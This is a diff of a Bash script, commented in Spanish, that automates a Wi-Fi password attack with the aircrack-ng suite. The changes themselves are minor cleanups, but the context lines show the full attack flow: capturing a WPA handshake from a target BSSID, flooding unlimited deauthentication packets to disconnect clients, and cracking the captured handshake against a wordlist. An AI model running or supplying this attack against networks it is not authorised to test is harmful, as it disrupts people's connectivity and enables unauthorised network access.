@@ -72,10 +72,8 @@ function monitoring_mode(){
 
 #Cambiare interface a modo normal
 function manage_mode(){
-    #ip link set $1 down
-    #iw $1 set type managed
-    #ip link set $1 up
     airmon-ng stop $1
+    service network-manager start
 }
 
 #------------------------------------------------------------------------------------------------
@@ -169,7 +167,7 @@ $TERM -e airodump-ng -w handshake --output-format cap -c $CANAL --bssid $BSSID $
 
 sleep 5
 
-#Lanzamos el ataque (paquetes de deautentificacion)
+#Lanzamos el ataque (paquetes de deautenticacion)
 echo -e "$BOLD_WHITE Ejecutando aireplay-ng para el lanzamiento de paquetes de deautenticación$WHITE"
 $TERM -e aireplay-ng --deauth 0 -a $BSSID $INT_NAME 
 
@@ -183,13 +181,13 @@ done
 
 if [[ "$SI_NO" == "S" || "$SI_NO" == "s" ]]
 then
-    echo -e -n "Introduce el nombre del wordlist $BOLD_WHITE\033[5m>\033[0m "
+    echo -e -n " Introduce el nombre del wordlist $BOLD_WHITE\033[5m>\033[0m "
     read WORDLIST
-    echo -e "Probando crackeo de la contraseña..."
+    echo -e " Probando crackeo de la contraseña..."
     aircrack-ng handshake-01.cap -w $WORDLIST >> crack.txt
 fi
 
+#Finalizamos la ejecucion del script dejando la interface como estaba
 echo " Restaurando interface a modo normal"
 manage_mode $INT_NAME
-service network-manager start
 
